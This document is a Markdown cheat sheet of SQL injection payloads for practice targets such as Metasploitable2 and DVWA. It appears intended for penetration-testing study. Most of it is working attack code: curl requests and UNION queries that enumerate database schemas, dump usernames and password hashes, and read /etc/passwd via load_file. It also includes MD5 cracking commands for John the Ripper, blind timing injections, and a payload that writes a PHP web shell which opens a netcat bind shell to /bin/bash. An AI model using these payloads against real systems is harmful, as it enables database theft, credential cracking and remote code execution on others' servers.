# SQL Injection

- [Config Metasploitable2](./configMetasploitable2.md)
- [Config Owasp](./ftp_user_config.md)

### Describe table columns
First the one need to find how many columns there are in the table
```bash
php -a
# check if the table has four columns
echo rawurlencode(' union select 1,2,3,4');

# At another tab
curl 10.0.0.3?id="1%20union%20select%201%2C2%2C3%2C4"
# if the curl does not return error, then, the table has four columns

```
### General examples
```bash
php -a

echo rawurlencode(' UNION SELECT 1,column_name,column_type,4 FROM information_schema.columns WHERE table_name="customers" -- ');

echo rawurlencode(' UNION SELECT * FROM customers -- ');

# At another cli tab
curl 10.0.0.3?id="1"

curl 10.0.0.3?id="1%20UNION%20SELECT%201%2Ccolumn_name%2Ccolumn_type%2C4%20FROM%20information_schema.columns%20WHERE%20table_name%3D%22customers%22%20--%20"

curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"

```

### Get hash type
```bash
#https://github.com/tashima42/hash-id#readme
snap install hash-id
hash-id --help
hash-id -h 8d3533d75ae2c3966d7e0d4fcc69216b # get hash type
```

### Metasploitable2 Injections
The single quote is needed becase it ends the first raw query param value and<br>
starts the sql injection statment.<br>
The same is for the #, it comments the rest of the raw query, allowing the injection.<br>

```sql
' union select 1,2,3 #
```

```sql
' union select database(),user(),version() #
```

```sql
-- same as
select database(); # at mysql terminal
```

```sql
' union select '',table_schema,table_name from information_schema.tables #
```

```sql
' union select '',column_name,'' from information_schema.columns where table_name='accounts' #
```

```sql
' union select '',username,password from accounts #
```

```sql
' union select '',column_name,'' from information_schema.columns where table_name='users' #
```

```sql
' union select '',concat(first_name,':',password),'' from dvwa.users #
```

```sql
# crack passwords with John the Ripper
john passwords.txt --format=raw-MD5
john passwords.txt --show --format=raw-MD5
```

```sql
' union select '','',load_file('/etc/passwd') #
```

```sql
' union select '','this is test','' into outfile '/tmp/mytest' #
```

```sql
' union select '<?php system("nc -lp 2222 -e /bin/bash"); ?>','','' into outfile '/tmp/myphp.php' #
```

```sql
# blind sql, if the query works, the request will wait 2 seconds and prints out 0
# meaning the password has the string 5f
' union select password,sleep(2),'' from dvwa.users where password like "5f%" #
```
